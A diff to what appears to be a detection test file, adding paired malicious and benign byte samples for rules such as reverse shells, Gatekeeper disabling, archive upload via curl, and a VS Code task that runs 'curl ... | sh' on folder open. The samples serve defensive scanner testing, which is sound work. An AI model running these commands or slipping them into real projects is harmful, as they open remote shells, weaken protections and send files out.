@@ -128,6 +128,19 @@ def pairs() -> list[tuple[str, bytes, bytes]]:
     )
     return [
         ("agent_base64_blob", base64_text(), b"payload:\n" + b"A" * 40 + b"\n"),
+        (
+            "agent_base64_blob",
+            b"-----BEGIN CERTIFICATE-----\n" + b"Q" * 400 + b"\n-----END CERTIFICATE-----\n"
+            b"x\n" + base64_text(),
+            b'<img src="data:image/png;base64,'
+            + base64.b64encode(b"\x89PNG\r\n\x1a\n" + bytes(400))
+            + b'">\n',
+        ),
+        (
+            "agent_base64_executable",
+            b'{"blob":"' + base64.b64encode(mini_pe() + bytes(400)) + b'"}\n',
+            b'{"blob":"' + base64.b64encode(b"\xca\xfe\xba\xbe" + bytes(400)) + b'"}\n',
+        ),
         ("agent_bidi_formatting", "Name: \u2067text\u2069\n".encode(), b"Name: text\n"),
         ("agent_bidi_override", "see\u202ethe\n".encode(), b"see the\n"),
         ("agent_eicar", eicar_bytes(), b"not a test file\n"),
@@ -640,6 +653,36 @@ def pairs() -> list[tuple[str, bytes, bytes]]:
             "win_lolbin_download",
             b"finger inert@example.invalid | cmd\r\n",
             b"finger alice@example.invalid\r\n",
+        ),
+        (
+            "script_reverse_shell",
+            b"bash -i >& /dev/tcp/192.0.2.10/4444 0>&1\n",
+            b"echo > /dev/tcp/127.0.0.1/22 && echo open\n",
+        ),
+        (
+            "script_reverse_shell",
+            b"nc -e /bin/sh 192.0.2.10 4444\n",
+            b"nc -zv example.invalid 443\n",
+        ),
+        (
+            "macos_gatekeeper_disable",
+            b"sudo spctl --master-disable\n",
+            b"sudo spctl --master-enable\n",
+        ),
+        (
+            "macos_archive_upload",
+            b"ditto -c -k --keepParent /tmp/c /tmp/o.zip\n"
+            b"curl -F file=@/tmp/o.zip https://example.invalid/u\n",
+            b"ditto -c -k --keepParent build/Inert.app Inert.zip\n"
+            b"xcrun notarytool submit Inert.zip --wait\n",
+        ),
+        (
+            "dev_vscode_autorun_task",
+            b'{"tasks":[{"label":"setup","type":"shell",'
+            b'"command":"curl -s https://example.invalid/a | sh",'
+            b'"runOptions":{"runOn":"folderOpen"}}]}\n',
+            b'{"tasks":[{"label":"watch","type":"npm","script":"watch",'
+            b'"runOptions":{"runOn":"folderOpen"}}]}\n',
         ),
         (
             "macos_keychain_dump",
